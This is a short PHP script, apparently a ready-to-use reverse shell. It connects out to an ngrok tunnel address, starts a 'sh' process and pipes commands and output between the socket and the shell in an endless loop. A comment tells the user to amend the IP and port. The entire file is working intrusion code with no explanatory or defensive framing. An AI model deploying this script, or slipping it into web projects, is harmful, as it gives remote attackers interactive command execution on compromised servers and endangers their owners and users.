<?php
set_time_limit(0);

// Amend the IP & port
$sock = fsockopen("0.tcp.ap.ngrok.io", 15704);
if ($sock) {
    $descriptorspec = [
        0 => ['pipe', 'r'], // stdin
        1 => ['pipe', 'w'], // stdout
        2 => ['pipe', 'w'], // stderr
    ];
    
    $process = proc_open('sh', $descriptorspec, $pipes);
    
    if (is_resource($process)) {
        // Set non-blocking mode on the socket
        stream_set_blocking($sock, 0);
        
        // Set non-blocking mode on the pipes
        foreach ($pipes as $pipe) {
            stream_set_blocking($pipe, 0);
        }
        
        // Copy data between the socket and the shell
        while (true) {
            // Check for data from the shell and send it back through the socket
            if ($output = fread($pipes[1], 1024)) {
                fwrite($sock, $output);
            }
            
            // Check for data from the socket and send it to the shell
            if ($input = fread($sock, 1024)) {
                fwrite($pipes[0], $input);
            }
        }
        
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
    }
}
?>